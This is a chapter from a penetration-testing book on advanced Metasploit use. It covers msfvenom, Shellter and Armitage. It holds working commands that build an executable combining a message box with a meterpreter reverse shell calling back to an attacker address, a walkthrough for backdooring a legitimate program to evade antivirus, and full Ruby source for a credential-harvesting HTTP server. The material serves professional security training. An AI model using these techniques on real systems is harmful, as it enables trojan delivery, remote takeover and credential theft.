<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer170">
<h1 id="_idParaDest-125"><em class="italic"><a id="_idTextAnchor124"/>Chapter 7</em>: Advanced Exploitation with Metasploit</h1>
<p>Anyone who has been in the field in the last 18 years knows what Metasploit can do. There are all kinds of Metasploiters out there, but we’re going to think about two kinds in particular. First, you have the intrepid amateur. They downloaded Kali Linux and installed it on a <strong class="bold">Virtual Machine</strong> (<strong class="bold">VM</strong>). Then, they fired up Metasploit and learned the basics – how to set an exploit, a payload, and the options, and then launch missiles! In this scenario, Metasploit quickly becomes the metaphorical hammer, and every problem starts to look like a nail. </p>
<p>On the other hand, there is the seasoned security administrator, who is comfortable with the command line. They fire up Metasploit and know how to search for specific modules, as well as how to gather the appropriate information to populate options fields. However, they feel bound by what’s already there. They recently found that they could make their life a lot easier by configuring quick-and-dirty servers for capturing packets of a particular protocol, and they wish the same solution could be fired up as a module. In this chapter, we will take a look at the more advanced uses of Metasploit. Though we only have limited pages to whet our appetites, this chapter should provide you with enough content to encourage fruitful research beyond these pages.</p>
<p>In this chapter, we will cover the following topics: </p>
<ul>
<li>Generating and nesting payloads with <strong class="source-inline">msfvenom</strong></li>
<li>Working with Shellter</li>
<li>The inner workings of Metasploit modules</li>
<li>Working with Armitage</li>
<li>The social engineering angle</li>
</ul>
<h1 id="_idParaDest-126"><a id="_idTextAnchor125"/>Technical requirements</h1>
<p>To get the most out of the hands-on material in this chapter, you’ll need the following equipment:</p>
<ul>
<li>A laptop running Kali Linux</li>
<li>Wine32 for Linux</li>
<li>Shellter</li>
<li>A USB thumb drive</li>
</ul>
<h1 id="_idParaDest-127"><a id="_idTextAnchor126"/>How to get it right the first time – generating payloads</h1>
<p>We’ve all seen some people who get their hands on Metasploit and start pulling the trigger. If you’re in your lab at home and are just watching what happens, that’s fine. If you do that on a professional assessment, you’re likely to get caught, setting off alarms without even getting <a id="_idIndexMarker525"/>anywhere. After all, pen testing isn’t about hacking a sitting duck – your client will have defenses that, for the most part, will be pretty solid. If your client isn’t good at prevention, they’ll probably be good at detection, and poorly crafted payloads hitting random IPs is a no-brainer for a defender. With this in mind, we need to learn how to craft our payloads according to the task at hand to maximize our success. The more successful we are, the more value we can bring to our client.</p>
<h2 id="_idParaDest-128"><a id="_idTextAnchor127"/>Installing Wine32 and Shellter</h2>
<p>Thankfully, Wine32 and Shellter are both included in Kali’s repository, so installing them is easy. We always <a id="_idIndexMarker526"/>recommend performing a documentation review on everything we <a id="_idIndexMarker527"/>install, but we particularly suggest it for Shellter.</p>
<p>While Wine32 is already installed on Kali, you’ll need to install Wine32 when you’re running Kali on a 64-bit system. To install Wine32, enter the following command:</p>
<p class="source-code"># dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</p>
<p>That’s all it takes! How much you use Wine32 will depend on your needs; if you’re out in the field running Linux <a id="_idIndexMarker528"/>VMs on a Windows host, you probably won’t take Wine32 to <a id="_idIndexMarker529"/>its limits. But if you have some flavor of Linux as your home OS, you’ll like Wine32’s performance advantages over a VM or emulator environment. </p>
<p>To set up Shellter, a native Windows application, use the following command:</p>
<p class="source-code"># apt-get install shellter</p>
<p>And that’s it! You’re now ready to play with Windows executables within Kali and dynamically inject evasive shellcode into applications – something we’ll look into in more depth in <a href="B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187"><em class="italic">Chapter 10</em></a>, <em class="italic">Shellcoding - The Stack</em>.</p>
<h2 id="_idParaDest-129"><a id="_idTextAnchor128"/>Payload generation goes solo – working with msfvenom</h2>
<p>Back in the old days, there were separate instances of the Metasploit Framework that you could fire up from the command line for generating payloads – they were <strong class="source-inline">msfpayload</strong> and <strong class="source-inline">msfencode</strong>. Kids these days can generate payloads with the one-stop-shop Metasploit Framework <a id="_idIndexMarker530"/>instance called <strong class="source-inline">msfvenom</strong>. Aside from the obvious <a id="_idIndexMarker531"/>advantage of a single command line with standardized flags for fine-tuning your attack, <strong class="source-inline">msfvenom</strong> is also faster.</p>
<p>So, what are payloads? It’s best if we first understand the core structure of Metasploit – <strong class="bold">modules</strong>. Modules are objects within Metasploit that get a certain job done, and the nature of the task defines <a id="_idIndexMarker532"/>the type of module. Payloads are just a module type within Metasploit, and their job is to contain code for remote execution. Payloads are used by exploit modules, which are delivery systems for our payload. We will discuss that in more detail later. For now, we’re looking at payload generation that can stand alone. This will give you unmatched flexibility when you’re in the field.</p>
<p>There are three different kinds of payload – singles, stagers, and stages. Singles are the true standalones of <a id="_idIndexMarker533"/>the bunch. They don’t even need to talk to Metasploit to <a id="_idIndexMarker534"/>phone home – you can catch them with a simple <strong class="source-inline">netcat</strong> command. Stagers and stages are related but distinct; a stager sets the stage for getting data to and from a target. In short, a stager creates a network connection. A stager payload is <a id="_idIndexMarker535"/>going to execute and then try <a id="_idIndexMarker536"/>to phone home, and since the connection is coming from inside, we can get around pesky <strong class="bold">Network Address Translation</strong> (<strong class="bold">NAT</strong>) firewalls. Stages are the payload <a id="_idIndexMarker537"/>components that are conveyed to the target by the stager. Let’s use a very <a id="_idIndexMarker538"/>common Meterpreter <a id="_idIndexMarker539"/>connect-back example – the Meterpreter component itself is the stage, and the module that creates the TCP connection back to the <a id="_idIndexMarker540"/>attacker is the stager. Of course, there’s no point in phoning home if no one is answering, so we must rely on handlers to receive and handle any connections.</p>
<p>Let’s check out what <strong class="source-inline">msfvenom</strong> offers us when we fire it up in a terminal window. Please note that for illustrative purposes, we will define the full names of the options. You are welcome to use the shorter flags in practice (for example, <strong class="source-inline">--payload</strong> is the same as <strong class="source-inline">-p</strong>):</p>
<p class="source-code"># msfvenom -h</p>
<p>Let’s explore some command lines:</p>
<ul>
<li>The <strong class="source-inline">--payload</strong> command defines the payload we’re going to use. Think of this as a behavior; this is what our payload is going to do. We’ll take a good look at specific payloads next.</li>
<li>The <strong class="source-inline">--list</strong> command will output the available modules for a given module type. So, let’s say you’re stuck on <strong class="source-inline">–payload</strong>; you can issue <strong class="source-inline">msfvenom --list payloads</strong> to get the list. However, if you don’t already know exactly what to build, you may need this list of available modules. If you’d rather utilize the search function in <strong class="source-inline">msfconsole</strong>, don’t worry – we’ll look at that next.</li>
<li>The <strong class="source-inline">--nopsled</strong> command is a shellcoding option that we will explore in more detail in <a href="B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187"><em class="italic">Chapter 10</em></a>, <em class="italic">Shellcoding - The Stack</em>.</li>
<li>The <strong class="source-inline">--format</strong> command represents the file type that will be created. This is where you’d specify EXE for when you’re making dastardly executables. This particular option, however, is an area where the flexibility of <strong class="source-inline">msfvenom</strong> shines, as many formats are available. We’ll be looking at a few in this book, but commanding <strong class="source-inline">--help-formats</strong> will help you get acquainted. </li>
<li>The <strong class="source-inline">--encoder</strong> command is another option that we’ll dive into in greater detail in <a href="B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187"><em class="italic">Chapter 10</em></a>, <em class="italic">Shellcoding - The Stack</em>. An encoder can change how code looks without changing the underlying functionality. For example, perhaps your payload needs to be encoded in an alphanumeric representation, or you need to eliminate characters that break execution. You would combine this with <strong class="source-inline">--bad-chars</strong> to get rid of code-breaking characters such as <strong class="source-inline">0x00</strong>. How a payload is encoded can <a id="_idIndexMarker541"/>be repeated over and over again with <strong class="source-inline">--iterations</strong>, which defines the number of passes through the encoder. This can make the payload a little stealthier (meaning it’s harder to detect), but it’s worth pointing out that encoding isn’t meant to bypass anything – its real purpose is to get the code ready for a particular environment. </li>
<li><strong class="source-inline">--arch</strong> and <strong class="source-inline">--platform</strong> allow you to specify the environment where a payload is going to run; for example, 32-bit (instruction set architecture) Windows (platform).</li>
<li>The <strong class="source-inline">--space</strong> command defines the maximum size of your payload in bytes. This is handy for situations where you know there is some sort of restriction. Encoded payload space is the same unless you want to define it as a different value. In this case, you’d use <strong class="source-inline">--encoder-space</strong>. <strong class="source-inline">--smallest</strong> is also useful, which generates the smallest possible payload.</li>
<li><strong class="source-inline">--add-code</strong> allows us to create a <em class="italic">two-for-one</em> deal by injecting the shellcode from a different generated payload into this payload. The source can be an executable or it can even be the raw output from a previous run of <strong class="source-inline">msfvenom</strong>. You can do this a few times over, potentially embedding several payloads into one. Though in reality, you’ll likely run into encoding problems if you do this.</li>
<li>The <strong class="source-inline">--template</strong> command allows you to use an existing executable as a template. A Windows executable is made up of many pieces, so you can’t just spit out some shellcode on its own – it needs to go somewhere. A template contains everything that’s needed to make a working executable – it’s just waiting for you to put your shellcode in it. You could also identify a specific executable here if you wish, and <strong class="source-inline">msfvenom</strong> will dump your payload into the text section of the executable (where general-purpose code that’s been put together by a compiler is located). This is powerful on its own, but this option is made all the more covert when it’s used in tandem with <strong class="source-inline">--keep</strong>, which keeps the original functionality of the template EXE and puts your shellcode in a new thread at execution.</li>
<li>The <strong class="source-inline">--out</strong> command defines the path where our payload gets spat out. </li>
<li>The <strong class="source-inline">--var-name</strong> command <a id="_idIndexMarker542"/>will matter to us when we cover shellcoding, but even then, it doesn’t do much. It’s really for those who like to stand apart from the crowd and use custom output variable names.</li>
<li>The <strong class="source-inline">--timeout</strong> command is a newer feature for generating large payloads; it prevents timeouts while the payload is being read. The need for this came about from users who were piping the output of <strong class="source-inline">msfvenom</strong> into <strong class="source-inline">msfvenom</strong>. You probably won’t use this option, but it’s nice to know it’s there.</li>
</ul>
<p>Now that we have an idea of the power that this tool provides, it’s time to conduct a single attack with two payloads.</p>
<h2 id="_idParaDest-130"><a id="_idTextAnchor129"/>Creating nested payloads</h2>
<p>Now, we’re going to prepare a demonstration for a client where the payload will display a message to the <a id="_idIndexMarker543"/>user that says <strong class="source-inline">You got pwned bro!</strong> while also creating a Meterpreter session for the listening handler. </p>
<p>There are two payloads, so there are two commands we must use; they are as follows:</p>
<p class="source-code"># msfvenom --arch x86 --platform windows --payload windows/messagebox ICON=INFORMATION TITLE="Sorry" TEXT="You got pwned bro! " --format raw &gt; Payload1</p>
<p class="source-code"># msfvenom --add-code Payload1 --arch x86 --platform windows --payload windows/meterpreter_reverse_tcp LHOST=192.168.108.106 LPORT=4567 --format exe &gt; demo.exe</p>
<p>With that, we’ve set the target architecture and platform to 32-bit Windows in both commands. In the first command, we set the payload to <strong class="source-inline">windows/messagebox</strong> and set the <strong class="source-inline">ICON</strong>, <strong class="source-inline">TITLE</strong>, and <strong class="source-inline">TEXT</strong> payload options. (If you’re going to use the exclamation mark, as we’ve done here, put a space after it so that you don’t escape the closing quotation marks, or use single quotes.) The format is raw binary as we’re going to import it into the next command with the <strong class="source-inline">--add-</strong> code. The second payload is <strong class="source-inline">windows/meterpreter_reverse_tcp</strong>, which is a Meterpreter session that connects back to us at <strong class="source-inline">LHOST</strong> (in reverse) over a TCP port, which we have defined with <strong class="source-inline">LPORT</strong>. Finally, we want to spit out the result in EXE format. Be mindful that this is just a demonstration; we would usually recommend other combinations of payloads, as message boxes are not exactly stealthy:</p>
<div>
<div class="IMG---Figure" id="_idContainer156">
<img alt="Figure 7.1 – The result of our payload’s execution " height="243" src="image/Figure_7.1_B17616.jpg" width="332"/>
</div>
</div>
<p class="figure-caption">Figure 7.1 – The result of our payload’s execution</p>
<p>Although we’ll be looking at the finer points of shellcoding later in this book, it’s worth mentioning that combining <a id="_idIndexMarker544"/>payloads is bound to put bad characters into your masterpiece. You should confirm your result in a test environment, using <strong class="source-inline">--bad-chars</strong> to eliminate things such as null bytes, which will almost definitely break Windows shellcode. Generating working shellcode isn’t magic, so don’t be surprised if certain payloads simply can’t be encoded!</p>
<h2 id="_idParaDest-131"><a id="_idTextAnchor130"/>Helter skelter – evading antivirus with Shellter</h2>
<p>Let’s take a look <a id="_idIndexMarker545"/>at the following steps:</p>
<ol>
<li>First, we need <a id="_idIndexMarker546"/>to start Shellter. To fire up Shellter, use the following command line:<p class="source-code"># shellter</p></li>
<li>Since we’re total noobs right now, we’ll be using Auto Mode here. Next, we need to identify the executable that we’re going to backdoor:</li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer157">
<img alt="Figure 7.2 – Loading Shellter in Wine32 " height="468" src="image/Figure_7.2_B17616.jpg" width="993"/>
</div>
</div>
<p class="figure-caption">Figure 7.2 – Loading Shellter in Wine32</p>
<p>Aside from ensuring that the executable is 32-bit, a good practice is to use an executable that can stand alone. Dependencies on proprietary DLLs often cause trouble. You should <a id="_idIndexMarker547"/>also verify that the program is considered <a id="_idIndexMarker548"/>clean by antivirus engines before you inject code into it; false positives are a reality of life in the antivirus world, and no amount of stealth during injection will change any inherently suspicious behavior. </p>
<p class="callout-heading">Note</p>
<p class="callout">At the time of writing, x64 injection is possible with the paid version of Shellter. Licenses are only for practicing professionals, but if it’s in your budget, I recommend supporting the project.</p>
<p>For our demonstration, we’re going to work with an old CD player utility for Windows. A 32-bit copy will run on pretty much any Windows system on its own – it just needs to be downloaded and executed. While we’re on the subject of picking executables for this purpose, we recommend being kind to the community and being creative with your work. For example, now that we’ve written this demo with <strong class="source-inline">CDPlayer.exe</strong>, it’s out there for the world to see and antivirus engines will have better heuristics for it. There’s often a tendency to repeat familiar processes, but it’s better to be creative.</p>
<ol>
<li value="3">After identifying the executable that we’re injecting our payload into, we enter <strong class="bold">Stealth Mode</strong> and select our payload. As shown in the following screenshot, seven of Metasploit’s stagers are built-in.</li>
<li>Shellter will ask you whether you have a custom payload (more on that later), but if your needs are <a id="_idIndexMarker549"/>covered by one of the existing seven, it’s <a id="_idIndexMarker550"/>best to just go with what works. In our case, we’re establishing a connect-back Meterpreter session, so we’ll go with payload index 1:</li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer158">
<img alt="Figure 7.3 – Payload selection in Shellter " height="639" src="image/Figure_7.3_B17616.jpg" width="633"/>
</div>
</div>
<p class="figure-caption">Figure 7.3 – Payload selection in Shellter</p>
<ol>
<li value="5">Shellter doesn’t take long once it has all the information it needs. The CD player will be injected and left where the original file is. Once the executable is on target, the victim fires it up, as shown in the following screenshot:</li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer159">
<img alt="Figure 7.4 – The CD player program running on the target PC " height="240" src="image/Figure_7.4_B17616.jpg" width="703"/>
</div>
</div>
<p class="figure-caption">Figure 7.4 – The CD player program running on the target PC</p>
<p>Meanwhile, at our attacking Kali box, the Meterpreter session has received the inbound connection and gets to work. This isn’t the most interesting part, though; what’s notable here is that the <a id="_idIndexMarker551"/>original executable is functioning exactly as <a id="_idIndexMarker552"/>expected. The CD player works flawlessly while we get to work stealing loot and establishing persistence on our target. Cool, huh? Shellter pulls this off by analyzing the flow of execution in the legitimate program (done in the tracing stage we looked at earlier) and places the shellcode at a natural point in the flow. There isn’t a sudden redirection to somewhere else in the code or a weird memory request, as you may see in non-dynamically infected executables. The code doesn’t look like something was injected into it; the code looks like it was always intended to do what it does, which is to provide users with a convenient way to play their old 1990s music CDs while quietly giving remote control to a third party of their computer.</p>
<p>Establishing control of a target while the user listens to music can be fun, but it can also demonstrate the extent of Shellter’s power. For example, when we checked the file we generated against the main players in the antivirus market, we discovered that we successfully evaded 67% of all vendors. As you can see, Shellter incorporates shellcode into the natural flow of execution in such a novel way that it can be very difficult to detect.</p>
<p class="callout-heading">Be Kind to the Community</p>
<p class="callout">If you don’t have a lab already, you may be tempted to play around with your creations on one of the many sites offering virus scans or sandboxed VMs for live testing. If you’re going to do this, make sure you are working in an environment that won’t share your submissions with the antimalware community! You just might find that what worked for you on day 1 has suddenly stopped working and that you’ve locked yourself out by giving your target too much information. Consider purchasing an account with the sandbox vendor so that they can give you a private environment; similarly, instead of the popular VirusTotal, consider AntiScan.me or NoDistribute.com for scanning and studying the antivirus response to your creations.</p>
<p>It’s important to keep in <a id="_idIndexMarker553"/>mind that this result is from a 10-minute demo that <a id="_idIndexMarker554"/>I put together for this book – there was no fine-tuning involved. Adapting your injected Trojan to a specific scenario within your client’s unique environment will be crucial. Perhaps your client uses one of the vendors who did <em class="italic">not</em> detect our demo as malicious – or maybe they use one of the other 33%, and you’ll have to get back to the drawing board. We’ll cover this kind of fine-tuning in <a href="B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187"><em class="italic">Chapter 10</em></a>, <em class="italic">Shellcoding - The Stack</em></p>
<h1 id="_idParaDest-132"><a id="_idTextAnchor131"/>Modules – the bread and butter of Metasploit</h1>
<p>We’ve already been playing around with modules within Metasploit. If it isn’t obvious by now, everything that is part of the Metasploit Framework is in its modules. Payloads are a kind of module; exploits are <a id="_idIndexMarker555"/>another kind of module that incorporates payloads. You can have exploit modules without payloads. They are known as auxiliary modules. To the uninitiated, it’s easy to think of <a id="_idIndexMarker556"/>the exploit modules as where the real excitement happens. Nothing feels quite so Hollywood as popping a shell after exploiting some obscure software flaw. But when you’re out in the field and find that almost all of that juicy pile of vulnerabilities isn’t present in client environments, you’ll find yourself relying on auxiliary modules instead. </p>
<p>Since we’ve already had a taste of how modules work, let’s look at the core of how they work by building one of our own. Although this is just a simple example, this will hopefully whet your appetite for more advanced module building later on. </p>
<h2 id="_idParaDest-133"><a id="_idTextAnchor132"/>Building a simple Metasploit auxiliary module</h2>
<p>I don’t know about you, but I’m not the biggest fan of Ruby. Although Ruby can be awkward at times, module building in Metasploit makes up for it by making the process very easy. If you can put <a id="_idIndexMarker557"/>together some basic Ruby and understand how the different methods work, you can build a module.</p>
<p>In this example, we’re throwing together a basic HTTP server that will prompt any visitor for credentials. It accomplishes this by kicking back a <em class="italic">401 Unauthorized</em> error to any request, which should prompt just about any browser to ask the user for credentials. Once the fake authentication is done, you can redirect the user to a URL of your choosing. Let’s look at this module chunk by chunk, starting with the following code:</p>
<p class="source-code">class MetasploitModule &lt; Msf::Auxiliary</p>
<p class="source-code">    include Msf::Exploit::Remote::HttpServer::HTML</p>
<p class="source-code">def initialize(info={})</p>
<p class="source-code">    super(update_info(info,</p>
<p class="source-code">        'Name' =&gt; 'HTTP Server: Basic Auth Credentials Capture',</p>
<p class="source-code">        'Description' =&gt; %q{</p>
<p class="source-code">        Prompt browser to request credentials via a 401 response.</p>
<p class="source-code">        },</p>
<p class="source-code">    ))</p>
<p class="source-code">    register_options([</p>
<p class="source-code">        OptString.new('REALM', [ true, "Authentication realm attribute to use.", "Secure Site" ]),</p>
<p class="source-code">        OptString.new('redirURL', [ false, "Redirect destination after sending credentials." ])</p>
<p class="source-code">    ])</p>
<p class="source-code">end</p>
<p>As you can see, once we have created the <strong class="source-inline">MetasploitModule</strong> class, a module is being imported with <strong class="source-inline">include</strong>. Modules imported in this way are usually called <strong class="bold">mixins</strong> as they are grabbing all of the <a id="_idIndexMarker558"/>methods from the referenced module and mixing them in. This is important to note when you’re building a module or even studying a module to <a id="_idIndexMarker559"/>learn how it works. If you’re just looking at the inner workings of a module, you should check out the mixin code, too. Equally, if you’re building a module, don’t reinvent the wheel if you can include a module with core functionality. In our example, we’re capturing credentials while posing as an HTTP server, so we bring in the abilities of <strong class="source-inline">Msf::Exploit::Remote::HttpServer::HTML</strong>.</p>
<p>Here, the <strong class="source-inline">initialize</strong> method takes <strong class="source-inline">info={}</strong> as an argument and is meant to provide general information about the auxiliary module, with <strong class="source-inline">super(update_info())</strong>, and then declare the options available to the user with <strong class="source-inline">register_options()</strong>. We’re not concerned with the general information for now; however, we are interested in the options. Options are user-defined variables known as <strong class="bold">datastore options</strong>. <strong class="source-inline">OptString.new()</strong> declares a variable of the string class, so we’re now allowing the <a id="_idIndexMarker560"/>user to define the authentication realm, which redirects the URL after the falsified authentication is complete. You may be thinking, <em class="italic">what about localhost and port?</em>, and you’d be right to.</p>
<p>Remember that we imported the HTTP server mixin, which already has its port and host declared, as shown in the following code: </p>
<p class="source-code">def run</p>
<p class="source-code">    @myhost = datastore['SRVHOST']</p>
<p class="source-code">    @myport = datastore['SRVPORT']</p>
<p class="source-code">    @realm = datastore['REALM']</p>
<p class="source-code">    print_status("Listening for connections on</p>
<p class="source-code">#{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")</p>
<p class="source-code">    Exploit</p>
<p class="source-code">end</p>
<p>Now, we have to create the <strong class="source-inline">run</strong> method, which is where the module’s functionality starts. Some instance variables are declared here using the values stored in the defined datastore options, and the user is then advised that we’re firing up a quick-and-dirty HTTP server.</p>
<p>Normally, the <strong class="source-inline">run</strong> method is where the juicy stuff goes, but in this case, we’re leveraging the HTTP server mixin. The real exploit that’s being called is just an HTTP server that returns <a id="_idIndexMarker561"/>requests and session data when someone connects to it. We also define the <strong class="source-inline">on_request_uri()</strong> method so that it does something with the returned data, as shown in the following code:</p>
<p class="source-code">def on_request_uri(cli, req)</p>
<p class="source-code">    if(req['Authorization'] and req['Authorization'] =~ /basic/i)</p>
<p class="source-code">        basic,auth = req['Authorization'].split(/\s+/)</p>
<p class="source-code">        user,pass = Rex::Text.decode_base64(auth).split(':', 2)</p>
<p class="source-code">        print_good("#{cli.peerhost} - Login captured! \"#{user}:#{pass}\" ")</p>
<p class="source-code">        if datastore['redirURL']</p>
<p class="source-code">            print_status("Redirecting client #{cli.peerhost} to #{datastore['redirURL']}")</p>
<p class="source-code">            send_redirect(cli, datastore['redirURL'])</p>
<p class="source-code">        else</p>
<p class="source-code">            send_not_found(cli)</p>
<p class="source-code">        end</p>
<p class="source-code">    else</p>
<p class="source-code">        print_status("We have a hit! Sending code 401 to client #{cli.peerhost} now... ")</p>
<p class="source-code">        response = create_response(401, "Unauthorized")</p>
<p class="source-code">        response.headers['WWW-Authenticate'] = "Basic realm=\"#{@realm}\""</p>
<p class="source-code">        cli.send_response(response)</p>
<p class="source-code">    end</p>
<p class="source-code">end</p>
<p class="source-code">end</p>
<p>Take a look at the general structure of the previous method. It’s essentially an <strong class="source-inline">if...else</strong> statement, which means that it is in reverse chronological order of events. This means we expect the initial request to come in, causing us to send back the 401 (the <strong class="source-inline">else</strong> statement) before we parse out the credentials that are sent back by the browser (the <strong class="source-inline">if</strong> statement). This is done because, from the perspective of the HTTP listener, anything that’s sent to the server is going to get passed to <strong class="source-inline">on_request_uri()</strong>.</p>
<p>The <strong class="source-inline">if</strong> statement will pass if the request contains an authentication attempt, parsing out and decoding the data <a id="_idIndexMarker562"/>from the inbound packet, and then displaying the captured credentials via <strong class="source-inline">print_good()</strong> (this means the process is a success). A nested <strong class="source-inline">if</strong> statement checks whether the user has defined the <strong class="source-inline">redirURL</strong> datastore option. If the check passes, an HTTP redirect is sent back; if it fails, a 404 is sent back. The <strong class="source-inline">on_request_uri()</strong> method is wrapped up with the <strong class="source-inline">else</strong> statement, which is executed if the inbound request is not an authentication attempt. An HTTP 401 response is created and sent, pulling the authentication realm from its respective datastore option.</p>
<p>Now, it’s time to get our module into Metasploit. The folder where all the modules are located is called <strong class="source-inline">/usr/share/metasploit-framework/modules</strong>. Inside this folder, you’ll see sub-folders for the different module types. Our demo is an auxiliary module, and we’re hosting a server, so ultimately, the path is <strong class="source-inline">/usr/share/metasploit-framework/modules/auxiliary/server</strong>.</p>
<p>Use <strong class="source-inline">cp</strong> or <strong class="source-inline">mv</strong> to get your module from your working folder to that specific location, and remember to note the filename of your module. Now, let’s fire up <strong class="source-inline">msfconsole</strong> as normal. </p>
<p>The Metasploit Framework will take several seconds to load because it’s checking all the modules to make sure they’re ready to rock, including yours. If you don’t see any syntax errors and Metasploit starts normally, congratulations – your new module made the cut!</p>
<p class="callout-heading">Metasploit – Making Life Easier</p>
<p class="callout">Getting experience with this manual work is always useful for your understanding and development, but Metasploit does allow us to work in module development and customization on the fly with the <strong class="source-inline">edit</strong> and <strong class="source-inline">reload</strong> commands. You can edit the module within Metasploit, and then use <strong class="source-inline">reload</strong> to make it available in your current session.</p>
<p>When we issue <strong class="source-inline">use</strong> to load our module, we refer to it by name and by folder structure. In our example, the <a id="_idIndexMarker563"/>module is called <strong class="source-inline">our_basic_HTTP.rb</strong>, so we called it with <strong class="source-inline">auxiliary/server/our_basic_HTTP</strong>. After setting whatever options you need, type <strong class="source-inline">exploit</strong>, and you should see something similar to the following screenshot:</p>
<div>
<div class="IMG---Figure" id="_idContainer160">
<img alt="Figure 7.5 – Running our module in the Metasploit console " height="598" src="image/Figure_7.5_B17616.jpg" width="1226"/>
</div>
</div>
<p class="figure-caption">Figure 7.5 – Running our module in the Metasploit console</p>
<p>Check out the flexibility that’s being offered here for today’s SSL world: you can negotiate SSL with a custom certificate, something that may come in handy when you’re impersonating appliances.</p>
<p>At this point, we’ve looked at Metasploit from down in the tactical gearbox. Now, let’s look at it from a higher, more strategic, perspective.</p>
<h1 id="_idParaDest-134"><a id="_idTextAnchor133"/>Efficiency and attack organization with Armitage</h1>
<p>We shouldn’t consider this a true Metasploit discussion without touching on Armitage. Armitage is a graphical frontend <a id="_idIndexMarker564"/>environment for Metasploit with a couple of huge advantages:</p>
<ul>
<li>Armitage allows for more efficient work. Many of the tedious aspects of working with a console <a id="_idIndexMarker565"/>are reduced, as many tasks can be automated by executing a series of actions with a single click. The user interface environment also makes organization a snap.</li>
<li>Armitage runs as a team server on a single machine, making it accessible from other Armitage clients on the network, which turns the Metasploit Framework into a fully fledged red-teaming attack platform. You can even script out your own Cortana-based red team bots. Even a single well-versed individual can become terrifying with Armitage as an interface to Metasploit. </li>
</ul>
<p>We’ll explore Armitage again during post-exploitation, where its power shines. For now, let’s take a look at how we can make our Metasploit tasks more project-friendly.</p>
<h2 id="_idParaDest-135"><a id="_idTextAnchor134"/>Getting familiar with your Armitage environment</h2>
<p>Our first task is getting Armitage installed. Thankfully, it’s in the repository, so using <strong class="source-inline">apt-get install armitage</strong> is all <a id="_idIndexMarker566"/>you need. Once that’s done, run the <strong class="source-inline">msfdb init</strong> command to initialize the database. Finally, start it up with the <strong class="source-inline">armitage</strong> command.</p>
<p>The first thing that happens is a logon prompt to an Armitage team server. The defaults are all you need for running locally, but this is where you’d punch in the details for a team server as part of a red team. Thankfully for us noobs, Armitage is pretty friendly and offers to start up the Metasploit RPC server for us if we haven’t already, as shown in the following screenshot:</p>
<div>
<div class="IMG---Figure" id="_idContainer161">
<img alt="Figure 7.6 – Armitage offering to start the RPC service " height="258" src="image/Figure_7.6_B17616.jpg" width="519"/>
</div>
</div>
<p class="figure-caption">Figure 7.6 – Armitage offering to start the RPC service</p>
<p>Metasploit’s prompt may feel a little patronizing, but hey, we can’t take these things personally.</p>
<p>There are three main windows you’ll work in – <strong class="bold">modules</strong>, <strong class="bold">targets</strong>, and the <strong class="bold">tabs</strong> view. As you will see, there’s a full module tree in a friendly drop-down folder format, complete with a search bar at the <a id="_idIndexMarker567"/>bottom. The <strong class="bold">targets</strong> window is on the top right, and you’ll see it populate with targets as you get to work. At the bottom is <strong class="bold">tabs</strong>, where everything you’d normally see at the <strong class="source-inline">msf</strong> prompt takes place within tabs corresponding to individual jobs; you’ll also see information about things such as services enumerated on a target.</p>
<p>Remember, Armitage is nothing more than a frontend for Metasploit – everything it can do, Metasploit can do too. Armitage essentially does all of the typing, while providing you with professional-grade attack organization. Of course, you can always type down in the console window and do whatever you like, just as you would in Metasploit.</p>
<p>The drop-down menu bar at the top has a lot of power, including being your starting point for enumerating targets. Let’s take a look.</p>
<h2 id="_idParaDest-136"><a id="_idTextAnchor135"/>Enumeration with Armitage</h2>
<p>Navigate to <strong class="bold">Hosts</strong> |<strong class="bold"> Nmap Scan </strong>|<strong class="bold"> Quick Scan (OS detect)</strong>. Enter the scan range, which we have <a id="_idIndexMarker568"/>entered here as <strong class="source-inline">192.168.108.0/24</strong>. Watch a new console <a id="_idIndexMarker569"/>tab called <strong class="bold">nmap</strong> pop up and then sit back and relax. You won’t see much happen until the scan reports that it’s finished, where the <strong class="bold">targets</strong> window will populate and the detected OS will be represented, as shown in the following screenshot:</p>
<div>
<div class="IMG---Figure" id="_idContainer162">
<img alt="Figure 7.7 – Recon with Armitage " height="586" src="image/Figure_7.7_B17616.jpg" width="1202"/>
</div>
</div>
<p class="figure-caption">Figure 7.7 – Recon with Armitage</p>
<p>You can now conduct a more thorough scan for an individual target and review the results of the service’s <a id="_idIndexMarker570"/>enumeration. Do this by right-clicking on a host and <a id="_idIndexMarker571"/>selecting <strong class="bold">Services</strong>. A new tab will pop open with a table that’s essentially a nicer way of looking at a Nmap version’s scan output.</p>
<p>Now, it’s time to talk about the elephant in the room – the graphical targets view. It’s pretty and all, and it makes for a nice Hollywood-hacker-movie demonstration for friends, but it isn’t practical in large and busy environments. Thankfully, you can navigate to <strong class="bold">Armitage</strong> | <strong class="bold">Set Target View</strong> and select <strong class="bold">Table View</strong> to change it.</p>
<h2 id="_idParaDest-137"><a id="_idTextAnchor136"/>Exploitation made ridiculously simple with Armitage</h2>
<p>Now comes the part where Armitage can save you a lot of time in the long run – understanding the <a id="_idIndexMarker572"/>attack surface and preparing potential attacks. Although you may be used to a more manual process, this time, we will select <strong class="bold">Attacks</strong> in the menu bar along the top and click on <strong class="bold">Find Attacks</strong>. You’ll see the progress bar for a brief period, and then a message wishing you well on your hunt. That’s it. So, what happened? Well, Armitage took the hosts and services enumeration data and automatically scanned the entire exploit module tree for matches. Right-click on a host and select <strong class="bold">Attack</strong>. For each service that’s detected with a match, there’s another dropdown naming the exploit that could potentially work. We say potentially as this is a <a id="_idIndexMarker573"/>very rough matching of service data and exploit options, and your homework isn’t done. You may enjoy clicking on random exploits to see what happens in your lab, but in the real world, you’re just making noise for no good reason.</p>
<p>One way to check for the applicability of an exploit is to use the appropriately named <strong class="source-inline">check</strong> command by performing the following steps:</p>
<ol>
<li value="1">In <strong class="source-inline">msfconsole</strong>, we can kick off this command from the prompt within a loaded module; in Armitage, we can accomplish the same feat by going to that same dropdown listing the exploits found, heading to the bottom of the list, and selecting exploits. Watch the <strong class="bold">Tab</strong> window come to life as each module is loaded automatically, and the <strong class="source-inline">check</strong> command is issued. Remember that an individual module has to support the <strong class="source-inline">check</strong> command, as not all do.</li>
